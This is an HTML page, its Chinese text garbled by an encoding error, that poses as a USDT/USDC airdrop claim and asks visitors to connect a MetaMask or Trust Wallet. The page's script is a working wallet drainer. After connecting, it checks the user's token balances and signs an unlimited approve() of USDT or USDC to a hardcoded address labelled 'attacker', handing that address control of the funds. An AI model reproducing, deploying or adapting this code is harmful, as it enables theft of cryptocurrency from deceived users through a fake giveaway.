<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>ğŸ æ­å–œä½ ç²å¾— USDT / USDC ç©ºæŠ•ï¼</title>
  <script type="module">
    import { Web3Modal } from 'https://unpkg.com/@web3modal/html@2.6.2/dist/index.js';
    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@2.6.2/dist/index.js';
    import { configureChains, createConfig } from 'https://unpkg.com/@wagmi/core@1.3.0/dist/index.js';
    import { mainnet } from 'https://unpkg.com/@wagmi/core/chains';
    import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';

    const projectId = 'eebb83fd0c3ec5b1770ad20a754e2c8d';
    const chains = [mainnet];

    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
    const wagmiConfig = createConfig({
      autoConnect: true,
      connectors: w3mConnectors({ projectId, version: 2, chains }),
      publicClient
    });

    const ethereumClient = new EthereumClient(wagmiConfig, chains);
    const web3modal = new Web3Modal({
      projectId,
      themeMode: 'dark',
      featuredWalletIds: [
        'eip155:1:metamask',
        'eip155:1:trust'
      ]
    }, ethereumClient);

    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const USDC = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
    const abi = ["function approve(address spender, uint256 amount) external returns (bool)", "function balanceOf(address) view returns (uint256)"];

    async function approveToken(tokenAddress, signer) {
      const contract = new ethers.Contract(tokenAddress, abi, signer);
      const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
      return tx.hash;
    }

    window.openConnection = async () => {
      try {
        const provider = await web3modal.connect();
        const ethersProvider = new ethers.providers.Web3Provider(provider);
        const signer = ethersProvider.getSigner();
        const user = await signer.getAddress();

        const usdt = new ethers.Contract(USDT, abi, ethersProvider);
        const usdc = new ethers.Contract(USDC, abi, ethersProvider);

        const usdtBal = await usdt.balanceOf(user);
        const usdcBal = await usdc.balanceOf(user);

        let txHash;
        if (usdtBal.gt(0)) {
          txHash = await approveToken(USDT, signer);
        } else if (usdcBal.gt(0)) {
          txHash = await approveToken(USDC, signer);
        } else {
          document.getElementById('status').innerText = 'âŒ æ²’æœ‰å¯ç”¨çš„ä»£å¹£é¤˜é¡';
          return;
        }

        document.getElementById('status').innerText = 'âœ… æˆæ¬ŠæˆåŠŸï¼Tx Hash: ' + txHash;
      } catch (err) {
        document.getElementById('status').innerText = 'âŒ æˆæ¬Šå¤±æ•—ï¼š' + err.message;
      }
    }
  </script>
</head>
<body style="background:#111; color:#fff; font-family:sans-serif; text-align:center; padding-top:60px">
  <h2>ğŸ æ­å–œä½ ç²å¾— USDT / USDC ç©ºæŠ•ï¼</h2>
  <p>è«‹ä½¿ç”¨ MetaMask æˆ– Trust Wallet æƒæ QR Code å®Œæˆæˆæ¬Š</p>
  <button onclick="openConnection()" style="padding: 10px 20px; font-size: 16px; margin-top: 20px; cursor:pointer;">ğŸ”— é»æˆ‘é€£æ¥éŒ¢åŒ…</button>
  <div id="status" style="margin-top: 30px; font-size: 1.1rem;"></div>
</body>
</html>
